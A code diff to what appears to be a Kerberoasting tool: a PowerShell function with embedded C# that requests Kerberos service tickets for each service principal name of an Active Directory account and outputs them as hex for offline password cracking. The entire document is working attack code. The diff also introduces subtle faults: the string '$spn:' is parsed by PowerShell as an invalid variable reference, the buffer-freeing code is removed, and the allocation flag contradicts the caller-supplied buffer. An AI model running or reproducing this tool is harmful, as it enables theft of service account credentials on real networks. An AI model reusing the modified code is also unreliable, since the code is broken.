@@ -17,7 +17,7 @@ public class K {
 
     [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     public static extern int InitializeSecurityContext(
-        IntPtr phCredential,
+        ref IntPtr phCredential,
         IntPtr phContext,
         string pszTargetName,
         uint fContextReq,
@@ -26,7 +26,7 @@ public class K {
         IntPtr pInput,
         uint Reserved2,
         out IntPtr phNewContext,
-        out SecBufferDesc pOutput,
+        ref SecBufferDesc pOutput,
         out uint pfContextAttr,
         out IntPtr ptsExpiry);
 
@@ -55,22 +55,21 @@ public class K {
         IntPtr ctx = IntPtr.Zero;
         IntPtr expiry1 = IntPtr.Zero;
         IntPtr expiry2 = IntPtr.Zero;
-        IntPtr bufPtr = IntPtr.Zero;
         uint attr = 0;
 
-        SecBuffer secBuf = new SecBuffer();
-        secBuf.BufferType = 2; // SECBUFFER_TOKEN
-        secBuf.cbBuffer = 0;
-        secBuf.pvBuffer = IntPtr.Zero;
-
         try {
-            bufPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SecBuffer)));
-            Marshal.StructureToPtr(secBuf, bufPtr, false);
+            SecBuffer secBuf = new SecBuffer();
+            secBuf.BufferType = 2; // SECBUFFER_TOKEN
+            secBuf.cbBuffer = 12288; // 0x3000 = 12KB buffer
+            secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
+
+            IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
+            Marshal.StructureToPtr(secBuf, pSecBuf, false);
 
             SecBufferDesc desc = new SecBufferDesc();
             desc.ulVersion = 0;
             desc.cBuffers = 1;
-            desc.pBuffers = bufPtr;
+            desc.pBuffers = pSecBuf;
 
             if (AcquireCredentialsHandle(
                     null,
@@ -85,36 +84,30 @@ public class K {
                 return "";
 
             if (InitializeSecurityContext(
-                    cred,
+                    ref cred,
                     IntPtr.Zero,
                     spn,
-                    0x00001000,
+                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
                     0,
                     16,
                     IntPtr.Zero,
                     0,
                     out ctx,
-                    out desc,
+                    ref desc,
                     out attr,
                     out expiry2) != 0)
                 return "";
 
-            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(desc.pBuffers, typeof(SecBuffer));
+            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
             if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
                 return "";
 
             byte[] data = new byte[resultBuf.cbBuffer];
             Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
+
             return BitConverter.ToString(data).Replace("-", "");
         } finally {
             if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
-            if (bufPtr != IntPtr.Zero) {
-                try {
-                    SecBuffer cleanup = (SecBuffer)Marshal.PtrToStructure(bufPtr, typeof(SecBuffer));
-                    if (cleanup.pvBuffer != IntPtr.Zero) FreeContextBuffer(cleanup.pvBuffer);
-                } catch { }
-                Marshal.FreeHGlobal(bufPtr);
-            }
         }
     }
 }
@@ -141,18 +134,18 @@ function Get-KerberosTicketBySamAccountName {
 
         foreach ($spn in $user.servicePrincipalName) {
             try {
-                Write-Host "Requesting ticket for SPN: ${spn}"
+                Write-Host "Requesting ticket for SPN: $spn"
                 $ticket = [K]::GetTicket($spn)
                 if ($ticket) {
-                    Write-Output "Kerberos ticket for ${spn}: $ticket"
+                    Write-Output "Kerberos TGS ticket (hex) for $spn:`n$ticket"
                 } else {
-                    Write-Warning "Failed to retrieve ticket for ${spn}."
+                    Write-Warning "Failed to retrieve ticket for $spn."
                 }
             } catch {
-                Write-Warning "Exception while requesting ticket for ${spn}: $_"
+                Write-Warning "Error for $spn: $_"
             }
         }
     } catch {
-        Write-Error "Error while querying Active Directory or processing SPNs: $_"
+        Write-Error "Active Directory query error: $_"
     }
 }
